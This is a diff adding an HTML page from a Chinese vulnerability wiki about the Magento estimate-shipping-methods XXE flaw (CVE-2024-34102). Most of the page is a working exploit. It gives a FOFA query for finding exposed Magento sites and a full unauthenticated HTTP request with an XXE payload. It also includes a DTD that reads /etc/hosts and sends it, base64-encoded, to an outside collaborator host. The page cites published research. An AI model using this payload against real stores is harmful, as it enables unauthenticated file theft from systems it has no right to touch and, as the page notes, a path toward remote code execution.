@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Magento/Magento%E5%BC%80%E6%BA%90%E7%94%B5%E5%AD%90%E5%95%86%E5%8A%A1%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3estimate-shipping-methods%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Magento开源电子商务平台接口estimate shipping methods存在XXE漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Magento\u5f00\u6e90\u7535\u5b50\u5546\u52a1\u5e73\u53f0\u63a5\u53e3estimate-shipping-methods\u5b58\u5728XXE\u6f0f\u6d1e(CVE-2024-34102)", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../2.2-sqli/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../2.2-sqli/" class="btn btn-xs btn-link">
+        Magento 2.2 SQL Injection
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Magento%202.2%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Magento%202.2%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Magento 2.2 SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="magentoestimate-shipping-methodsxxecve-2024-34102">Magento开源电子商务平台接口estimate-shipping-methods存在XXE漏洞(CVE-2024-34102)<a class="headerlink" href="#magentoestimate-shipping-methodsxxecve-2024-34102" title="Permanent link">&para;</a></h2>
+<p>2024年6月，Adobe官方披露CVE-2024-34102 Magento estimate-shipping-methods XXE漏洞，攻击者可在无需登陆的情况下构造恶意请求利用XXE读取文件，或者结合CVE-2024-2961 可能造成远程代码执行。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;Adobe-Magento&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods HTTP/2</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">example.com</span>
+<span class="nt">Accept</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application/json, text/javascript, */*; q=0.01</span>
+<span class="nt">X-Requested-With</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">XMLHttpRequest</span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application/json</span>
+<span class="nt">Content-Length</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">274</span>
+
+<span class="p p-Indicator">{</span>
+<span class="w">  </span><span class="s">&quot;address&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="p p-Indicator">{</span>
+<span class="w">    </span><span class="s">&quot;totalsReader&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="p p-Indicator">{</span>
+<span class="w">      </span><span class="s">&quot;collectorList&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="p p-Indicator">{</span>
+<span class="w">        </span><span class="s">&quot;totalCollector&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="p p-Indicator">{</span>
+<span class="w">          </span><span class="s">&quot;sourceData&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="p p-Indicator">{</span>
+<span class="w">            </span><span class="s">&quot;data&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">&quot;&lt;?xml</span><span class="nv"> </span><span class="s">version=\&quot;1.0\&quot;</span><span class="nv"> </span><span class="s">?&gt;</span><span class="nv"> </span><span class="s">&lt;!DOCTYPE</span><span class="nv"> </span><span class="s">r</span><span class="nv"> </span><span class="s">[</span><span class="nv"> </span><span class="s">&lt;!ELEMENT</span><span class="nv"> </span><span class="s">r</span><span class="nv"> </span><span class="s">ANY</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">&lt;!ENTITY</span><span class="nv"> </span><span class="s">%</span><span class="nv"> </span><span class="s">sp</span><span class="nv"> </span><span class="s">SYSTEM</span><span class="nv"> </span><span class="s">\&quot;http://your_ip:9999/dtd.xml\&quot;&gt;</span><span class="nv"> </span><span class="s">%sp;</span><span class="nv"> </span><span class="s">%param1;</span><span class="nv"> </span><span class="s">]&gt;</span><span class="nv"> </span><span class="s">&lt;r&gt;&amp;exfil;&lt;/r&gt;&quot;</span><span class="p p-Indicator">,</span>
+<span class="w">            </span><span class="s">&quot;options&quot;</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="nv">16</span>
+<span class="w">          </span><span class="p p-Indicator">}</span>
+<span class="w">        </span><span class="p p-Indicator">}</span>
+<span class="w">      </span><span class="p p-Indicator">}</span>
+<span class="w">    </span><span class="p p-Indicator">}</span>
+<span class="w">  </span><span class="p p-Indicator">}</span>
+<span class="p p-Indicator">}</span>
+</code></pre></div>
+<p>DTD 文件</p>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;&gt;</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://collabid.oastify.com/dtd.xml?%data;&#39;&gt;&quot;&gt;</span>
+</code></pre></div>
+<p><img alt="img" src="https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/667bc2f3b5142eeccc853498_xxe-dtd-out-magento.png" /></p>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102">https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../2.2-sqli/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../2.2-sqli/" class="btn btn-xs btn-link">
+        Magento 2.2 SQL Injection
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Magento%202.2%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Magento%202.2%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Magento 2.2 SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
